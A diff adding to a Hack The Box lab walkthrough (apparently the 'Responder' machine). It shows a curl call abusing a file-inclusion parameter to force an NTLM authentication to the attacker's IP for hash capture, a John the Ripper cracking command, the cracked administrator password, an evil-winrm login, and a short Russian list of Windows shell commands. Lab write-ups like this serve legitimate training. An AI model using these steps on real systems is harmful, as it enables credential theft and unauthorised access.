@@ -60,10 +60,28 @@ sudo responder -I tun0 -v
 task 8: There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as john, but the full name is what?.
 ans: John the Ripper
 
-
+~~~
+curl "http://unika.htb/index.php?page=//10.10.14.39/somefile"
+~~~
+~~~
+john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt shash.txt
+~~~
 
 task 9: What is the password for the administrator user?
 ans: badminton
 
+~~~
+evil-winrm -i 10.129.95.234 -u administrator -p badminton
+~~~
 
+
+### navigation win
+whoami	Показывает текущего пользователя
+hostname	Имя компьютера
+cd	Сменить директорию
+dir	Показать содержимое папки (аналог ls)
+type	Показать содержимое файла (аналог cat)
+echo	Вывести текст или записать в файл
+cls	Очистить экран
+exit	Выйти из сессии
 
